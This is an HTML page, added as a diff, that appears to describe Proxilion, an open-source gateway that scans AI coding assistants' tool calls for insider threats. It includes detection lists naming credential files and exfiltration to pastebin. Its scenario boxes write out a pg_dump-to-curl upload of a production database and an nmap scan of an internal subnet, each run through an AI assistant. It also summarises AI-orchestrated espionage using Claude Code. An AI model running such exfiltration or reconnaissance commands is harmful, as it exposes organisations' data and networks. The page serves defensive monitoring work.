@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Technical Deep Dive - How Proxilion prevents insider threats when your employees have AI coding assistants. Architecture decisions, detection coverage, and deployment details.">
+    <title>Technical Deep Dive - Proxilion MCP Security Gateway</title>
+
+    <!-- Favicons -->
+    <link rel="icon" type="image/x-icon" href="favicon.ico">
+    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
+
+    <!-- SEO Meta Tags -->
+    <meta name="keywords" content="proxilion, mcp security, ai coding assistants, insider threat detection, claude code security, github copilot security, rust security gateway">
+    <meta name="author" content="Clay Good">
+    <meta name="robots" content="index, follow">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://proxilion.com/technical-deep-dive.html">
+    <meta property="og:title" content="Technical Deep Dive - Proxilion MCP Security Gateway">
+    <meta property="og:description" content="Preventing insider threats when your employees have AI coding assistants. Architecture, detection coverage, and real-world scenarios.">
+    <meta property="og:image" content="https://proxilion.com/og-image.png">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --bg: #000000;
+            --bg-secondary: #0a0a0a;
+            --text: #ffffff;
+            --text-muted: #999999;
+            --accent: #ffffff;
+            --border: #222222;
+            --shadow: rgba(255, 255, 255, 0.1);
+            --code-bg: #0f0f0f;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.8;
+            -webkit-font-smoothing: antialiased;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle at 50% 0%, rgba(255, 255, 255, 0.03) 0%, transparent 50%);
+            pointer-events: none;
+        }
+
+        nav {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background: rgba(0, 0, 0, 0.95);
+            border-bottom: 1px solid var(--border);
+            padding: 20px 0;
+            z-index: 1000;
+            backdrop-filter: blur(10px);
+        }
+
+        nav .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        nav .logo {
+            font-size: 1.5rem;
+            font-weight: 900;
+            color: var(--accent);
+            text-decoration: none;
+            letter-spacing: -0.02em;
+        }
+
+        nav a {
+            color: var(--text-muted);
+            text-decoration: none;
+            font-weight: 600;
+            transition: color 0.3s ease;
+        }
+
+        nav a:hover {
+            color: var(--accent);
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 0 40px;
+            position: relative;
+        }
+
+        article {
+            margin-top: 120px;
+            margin-bottom: 100px;
+            animation: fadeIn 1s ease-out;
+        }
+
+        .article-header {
+            text-align: center;
+            margin-bottom: 80px;
+            padding-bottom: 60px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .article-title {
+            font-size: 3.5rem;
+            font-weight: 900;
+            letter-spacing: -0.04em;
+            margin-bottom: 30px;
+            line-height: 1.2;
+            color: var(--text);
+        }
+
+        .article-meta {
+            font-size: 1.1rem;
+            color: var(--text-muted);
+            margin-top: 20px;
+        }
+
+        .article-content h2 {
+            font-size: 2.5rem;
+            font-weight: 800;
+            margin-top: 80px;
+            margin-bottom: 30px;
+            letter-spacing: -0.03em;
+            color: var(--text);
+        }
+
+        .article-content h3 {
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-top: 60px;
+            margin-bottom: 25px;
+            letter-spacing: -0.02em;
+            color: var(--text);
+        }
+
+        .article-content p {
+            font-size: 1.2rem;
+            line-height: 1.9;
+            margin-bottom: 30px;
+            color: var(--text);
+        }
+
+        .article-content ul {
+            list-style: none;
+            margin: 30px 0;
+        }
+
+        .article-content ul li {
+            font-size: 1.2rem;
+            line-height: 1.8;
+            margin-bottom: 15px;
+            padding-left: 30px;
+            position: relative;
+            color: var(--text);
+        }
+
+        .article-content ul li:before {
+            content: '•';
+            position: absolute;
+            left: 10px;
+            color: var(--accent);
+            font-weight: bold;
+        }
+
+        .article-content strong {
+            color: var(--accent);
+            font-weight: 700;
+        }
+
+        .article-content code {
+            background: var(--code-bg);
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-family: 'SF Mono', 'Monaco', 'Inconsolata', 'Fira Code', monospace;
+            font-size: 0.9em;
+            color: var(--text);
+            border: 1px solid var(--border);
+        }
+
+        .article-content pre {
+            background: var(--code-bg);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 25px;
+            overflow-x: auto;
+            margin: 30px 0;
+            line-height: 1.6;
+        }
+
+        .article-content pre code {
+            background: none;
+            padding: 0;
+            border: none;
+            font-size: 1rem;
+        }
+
+        .article-content a {
+            color: var(--accent);
+            text-decoration: underline;
+            transition: opacity 0.3s ease;
+        }
+
+        .article-content a:hover {
+            opacity: 0.7;
+        }
+
+        .highlight-box {
+            background: rgba(255, 255, 255, 0.02);
+            border-left: 4px solid var(--accent);
+            padding: 30px;
+            margin: 40px 0;
+            border-radius: 8px;
+        }
+
+        .highlight-box p {
+            margin-bottom: 0;
+            font-size: 1.25rem;
+            color: var(--text);
+        }
+
+        .scenario-box {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 40px;
+            margin: 40px 0;
+        }
+
+        .scenario-box h4 {
+            font-size: 1.6rem;
+            margin-bottom: 20px;
+            color: var(--accent);
+        }
+
+        .btn-primary {
+            display: inline-block;
+            padding: 20px 50px;
+            background: var(--bg);
+            color: var(--accent);
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 1.1rem;
+            letter-spacing: 0.03em;
+            text-transform: uppercase;
+            transition: all 0.3s ease;
+            border: 2px solid var(--accent);
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(255, 255, 255, 0.1);
+        }
+
+        .btn-primary:hover {
+            background: var(--accent);
+            color: var(--bg);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 30px rgba(255, 255, 255, 0.2);
+        }
+
+        footer {
+            text-align: center;
+            padding: 60px 0;
+            color: var(--text-muted);
+            font-size: 1rem;
+            border-top: 1px solid var(--border);
+        }
+
+        footer a {
+            color: var(--accent);
+            text-decoration: none;
+            font-weight: 600;
+            transition: opacity 0.3s ease;
+        }
+
+        footer a:hover {
+            opacity: 0.7;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 0 25px;
+            }
+
+            .article-title {
+                font-size: 2.5rem;
+            }
+
+            .article-content h2 {
+                font-size: 2rem;
+            }
+
+            .article-content h3 {
+                font-size: 1.5rem;
+            }
+
+            .article-content p,
+            .article-content ul li {
+                font-size: 1.1rem;
+            }
+
+            .btn-primary {
+                width: 100%;
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <nav>
+        <div class="container">
+            <a href="index.html" class="logo">PROXILION</a>
+            <a href="https://github.com/clay-good/proxilion" target="_blank">GitHub</a>
+        </div>
+    </nav>
+
+    <div class="container">
+        <article>
+            <header class="article-header">
+                <h1 class="article-title">Preventing Insider Threats in AI Coding Assistants</h1>
+                <p class="article-meta">Technical Deep Dive</p>
+            </header>
+
+            <div class="article-content">
+                <p>On November 13, 2025, Anthropic published <a href="https://www.anthropic.com/news/disrupting-AI-espionage" target="_blank">a report</a> documenting the first large-scale AI-orchestrated cyber espionage campaign (GTG-1002). The attackers used Claude Code with 80-90% autonomy to discover vulnerabilities, generate exploits, harvest credentials, and exfiltrate data.</p>
+
+                <p>The attackers controlled their own infrastructure. They weren't exploiting victims' AI tools.</p>
+
+                <h2>The Real Threat</h2>
+
+                <p>The actual risk for organizations isn't external attackers using AI. It's insiders weaponizing the AI tools you've already deployed:</p>
+
+                <ul>
+                    <li>Disgruntled employee uses Claude Code to exfiltrate the customer database</li>
+                    <li>Compromised account uses GitHub Copilot to scan internal networks and harvest SSH keys</li>
+                    <li>Rogue AI agent exceeds its scope and accesses production credentials</li>
+                </ul>
+
+                <div class="highlight-box">
+                    <p>Organizations deploy Claude Code, Copilot, and Cursor to thousands of employees with zero security monitoring.</p>
+                </div>
+
+                <h2>What Proxilion Does</h2>
+
+                <p>Proxilion sits between AI coding assistants and their tool execution layer. Every bash command, file access, or API call goes through real-time threat analysis before execution.</p>
+
+                <h3>Why Rust?</h3>
+
+                <p>The gateway processes thousands of requests per second with <50ms P95 latency:</p>
+
+                <ul>
+                    <li><strong>Memory safety:</strong> The gateway cannot become an attack vector. No buffer overflows or use-after-free vulnerabilities.</li>
+                    <li><strong>Zero-cost abstractions:</strong> Pattern matching and regex compilation happen at compile time.</li>
+                    <li><strong>Fearless concurrency:</strong> Thread-safe session state tracking without locks.</li>
+                    <li><strong>No garbage collection:</strong> Predictable latency under load.</li>
+                    <li><strong>Single binary deployment:</strong> No dependencies, no runtime. Build once, deploy anywhere.</li>
+                </ul>
+
+                <h3>Why MCP Layer?</h3>
+
+                <p>Model Context Protocol (MCP) is where AI tools execute actions:</p>
+
+                <ul>
+                    <li><strong>Universal coverage:</strong> Works with Claude Code, Cursor, Windsurf, any MCP-compatible tool</li>
+                    <li><strong>Pre-execution analysis:</strong> We see commands before they run, not after damage is done</li>
+                    <li><strong>Full context:</strong> Tool calls include conversation history for social engineering detection</li>
+                    <li><strong>Low latency:</strong> HTTP interceptor adds <50ms</li>
+                    <li><strong>No AI modification:</strong> Drop-in proxy, no changes to Claude or other AI models</li>
+                </ul>
+
+                <h2>Detection Coverage</h2>
+
+                <p><strong>High-confidence detection (90-100%):</strong></p>
+                <ul>
+                    <li>Network reconnaissance (nmap, masscan, service enumeration)</li>
+                    <li>Credential file access (SSH keys, .env files, cloud credentials)</li>
+                    <li>Hacking tools (sqlmap, metasploit, burpsuite)</li>
+                    <li>Privilege escalation (sudo abuse, setuid manipulation, IAM role changes)</li>
+                </ul>
+
+                <p><strong>Medium-confidence detection (70-90%):</strong></p>
+                <ul>
+                    <li>Data exfiltration (curl to pastebin, large transfers to external IPs)</li>
+                    <li>Multi-phase kill chains (reconnaissance → access → exfiltration over hours)</li>
+                    <li>Social engineering (conversation analysis, pretexting, authority manipulation)</li>
+                    <li>Lateral movement (SSH/RDP across internal networks, port scanning)</li>
+                </ul>
+
+                <p><strong>Detection limitations (30-70%):</strong></p>
+                <ul>
+                    <li>Novel attack techniques not in our pattern database</li>
+                    <li>Highly fragmented attacks (50+ micro-requests over weeks)</li>
+                    <li>Attacks specifically designed to evade pattern detection</li>
+                    <li>Zero-day exploits with no behavioral indicators</li>
+                </ul>
+
+                <div class="highlight-box">
+                    <p><strong>Overall detection rate:</strong> 75-85% against sophisticated attacks like GTG-1002.</p>
+                    <p style="margin-top: 15px;">This is one layer in defense-in-depth, not a silver bullet.</p>
+                </div>
+
+                <h2>Detection Engine</h2>
+
+                <p><strong>25 specialized analyzers</strong> running in parallel:</p>
+
+                <p><strong>Pattern-Based (18 analyzers):</strong></p>
+                <ul>
+                    <li>Enumeration: nmap, masscan, port scans, service discovery</li>
+                    <li>Credential Access: SSH keys, .env, .aws/credentials, cloud configs</li>
+                    <li>Exfiltration: URL analysis for pastebin, suspicious IPs, large POST bodies</li>
+                    <li>Hacking Tools: sqlmap, metasploit, burpsuite, nikto</li>
+                    <li>Privilege Escalation: sudo abuse, setuid binaries, IAM policy changes</li>
+                    <li>Lateral Movement: SSH/RDP connections, network pivoting</li>
+                </ul>
+
+                <p><strong>Session-Aware (4 analyzers):</strong></p>
+                <ul>
+                    <li>Session Progression: Kill chain tracking (recon → access → exfil)</li>
+                    <li>Request Rate: Burst detection, machine timing vs. human timing</li>
+                    <li>AI Velocity: Autonomous agent detection, acceleration patterns</li>
+                    <li>Task Fragmentation: Multi-request attacks spread across time</li>
+                </ul>
+
+                <p><strong>Semantic Analysis (3 analyzers) - Optional, requires Claude API:</strong></p>
+                <ul>
+                    <li>Conversation Analysis: Social engineering detection</li>
+                    <li>Prompt Engineering: Jailbreak attempt detection</li>
+                    <li>Intent Clarification: Ambiguous command analysis</li>
+                </ul>
+
+                <p><strong>Scoring:</strong> Each analyzer returns 0-100. Composite score is weighted average.</p>
+                <ul>
+                    <li>0-49: Allow (audit log only)</li>
+                    <li>50-69: Alert (notify security team, allow execution)</li>
+                    <li>70-89: Block (prevent this specific command)</li>
+                    <li>90-100: Terminate (kill entire session, disable user)</li>
+                </ul>
+
+                <h3>Session State Tracking</h3>
+
+                <p>Redis tracks session history across hours and days for kill chain detection:</p>
+
+                <pre><code>Monday 10:00 AM: nmap scan (score: 85, BLOCKED)
+Monday 2:30 PM: cat .env (score: 70, BLOCKED)
+Monday 6:45 PM: curl pastebin (score: 65, ALERT)
+
+Session Progression: 3 phases detected across 9 hours
+Composite Score: 96 (TERMINATE SESSION)</code></pre>
+
+                <p>Individual requests might score below blocking threshold, but multi-phase progression triggers termination.</p>
+
+                <h3>Performance</h3>
+
+                <p><strong>Latency (measured under load):</strong></p>
+                <ul>
+                    <li>Pattern analysis: 5-15ms P95</li>
+                    <li>Session state lookup: 2-5ms P95 (Redis)</li>
+                    <li>Semantic analysis: 200-500ms P95 (Claude API, optional)</li>
+                    <li>Total: <50ms P95 without semantic</li>
+                </ul>
+
+                <p><strong>Throughput:</strong></p>
+                <ul>
+                    <li>Single instance: 10,000+ requests/second</li>
+                    <li>Horizontal scaling: Linear (stateless design)</li>
+                    <li>Redis bottleneck: ~100,000 requests/second per cluster</li>
+                </ul>
+
+                <h2>Deployment</h2>
+
+                <p><strong>Self-hosted only.</strong> This is not a SaaS product.</p>
+
+                <p>Security teams will not send internal tool execution logs to third-party APIs. Every command contains proprietary information (internal IPs, database names, employee IDs, project codenames).</p>
+
+                <p>We provide:</p>
+                <ul>
+                    <li>Docker Compose for single-server deployment (10-100 users)</li>
+                    <li>Kubernetes manifests for HA deployment (100-10,000 users)</li>
+                </ul>
+
+                <p>Data never leaves your infrastructure. Source code is auditable. Modify analyzers for your threat model.</p>
+
+                <h2>Real-World Scenarios</h2>
+
+                <div class="scenario-box">
+                    <h4>Scenario 1: Database Exfiltration Prevented</h4>
+                    <p>Employee gives notice on Friday. Monday morning:</p>
+                    <pre><code># Employee to Claude Code: "Help me back up the customer database for documentation"
+pg_dump production_db | gzip | curl -F "file=@-" https://personal-s3-bucket</code></pre>
+
+                    <p><strong>Proxilion Analysis:</strong></p>
+                    <ul>
+                        <li>Database dump tool detected (score: 75)</li>
+                        <li>Compression before transfer (score: +10)</li>
+                        <li>External upload destination (score: +15)</li>
+                        <li><strong>Composite score: 96 - TERMINATE</strong></li>
+                    </ul>
+
+                    <p>Session killed. Security team alerted. Employee account disabled.</p>
+                </div>
+
+                <div class="scenario-box">
+                    <h4>Scenario 2: Compromised Account Contained</h4>
+                    <p>Attacker gains access to developer's Claude Code session via phishing:</p>
+                    <pre><code># Attacker via AI: "Scan the internal network to understand the infrastructure"
+nmap -sV 10.0.0.0/24 -p 22,80,443,3306,5432</code></pre>
+
+                    <p><strong>Proxilion Analysis:</strong></p>
+                    <ul>
+                        <li>Hacking tool detected: nmap (score: 85)</li>
+                        <li>Internal network target (score: +5)</li>
+                        <li>Multi-port scanning (score: +5)</li>
+                        <li><strong>Composite score: 88 - BLOCK</strong></li>
+                    </ul>
+
+                    <p>Command blocked. Reconnaissance prevented. Breach contained before lateral movement.</p>
+                </div>
+
+                <div class="scenario-box">
+                    <h4>Scenario 3: Legitimate Admin Work Allowed</h4>
+                    <p>DevOps engineer during incident response:</p>
+                    <pre><code># Engineer to Claude: "Check if SSH is running on the backup server"
+ssh user@backup-server.internal systemctl status sshd</code></pre>
+
+                    <p><strong>Proxilion Analysis:</strong></p>
+                    <ul>
+                        <li>SSH connection to internal server (score: 45)</li>
+                        <li>systemctl command (legitimate admin) (score: +5)</li>
+                        <li>Conversation context: "incident response" (legitimacy: -10)</li>
+                        <li><strong>Composite score: 40 - ALLOW</strong></li>
+                    </ul>
+
+                    <p>No false positive. Legitimate work allowed.</p>
+                </div>
+
+                <h2>Cost Analysis</h2>
+
+                <p><strong>Infrastructure</strong> (100 developers):</p>
+                <ul>
+                    <li>Self-hosted: $200/month (2x t3.medium + Redis cluster)</li>
+                    <li>Managed cloud: $500/month (ECS Fargate + ElastiCache)</li>
+                </ul>
+
+                <p><strong>Semantic analysis</strong> (optional):</p>
+                <ul>
+                    <li>With prompt caching: $50/month (1,000 requests/day, 62% cost reduction)</li>
+                    <li>Without prompt caching: $130/month</li>
+                    <li>Disabled: $0 (pattern-based detection only)</li>
+                </ul>
+
+                <div class="highlight-box">
+                    <p><strong>Total:</strong> $250-650/month for 100 developers</p>
+                    <p style="margin-top: 15px;"><strong>Value:</strong> Preventing a single $50M data breach = 600,000% ROI</p>
+                </div>
+
+                <h2>Why Now</h2>
+
+                <p>GTG-1002 showed what AI can do when weaponized. That capability now exists inside every organization deploying AI coding assistants to employees.</p>
+
+                <p>The question is not "could an insider weaponize AI tools?" The answer is yes.</p>
+
+                <p>The question is "do you have visibility and controls when it happens?"</p>
+
+                <p>Right now, for most organizations, the answer is no.</p>
+
+                <div style="text-align: center; margin-top: 80px;">
+                    <a href="https://github.com/clay-good/proxilion" class="btn-primary" target="_blank">Get Started on GitHub</a>
+                </div>
+            </div>
+        </article>
+
+        <footer>
+            <p>Built with transparency by <a href="https://github.com/clay-good" target="_blank" rel="noopener">Clay Good</a></p>
+            <p style="margin-top: 15px; font-size: 0.9rem;">Open Source • MIT License • Self-Hosted</p>
+        </footer>
+    </div>
+</body>
+</html>
